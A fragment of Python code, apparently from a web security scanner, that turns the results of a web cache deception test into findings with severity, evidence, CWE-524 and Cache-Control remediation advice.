                    "description": (
                        f"Authenticated response for '{deception_url}' appears cached ({hit_header}). "
                        "Unauthenticated re-fetch returned HTTP 200. No predefined sensitive patterns detected."
                    ),
                    "evidence": f"Cache: {hit_header}\nResponse: {b2[:400]}",
                    "remediation": "Add Cache-Control: no-store, private to authenticated responses.",
                    "cvss_score": 5.3, "cwe_id": "CWE-524",
                })

        if not findings:
            findings.append({
                "title": "Web Cache Deception — no cache-served sensitive data detected",
                "severity": "info",
                "url": url,
                "description": "Tested suffixes did not result in cached sensitive data exposure.",
                "evidence": "\n".join(raw_lines[-10:]),
                "remediation": "Ensure Cache-Control: no-store is set on sensitive authenticated endpoints.",
            })

        stream("success", f"Web cache deception test complete — {len(findings)} finding(s)")
        return {"status": "done", "findings": findings, "raw_output": "\n".join(raw_lines)}
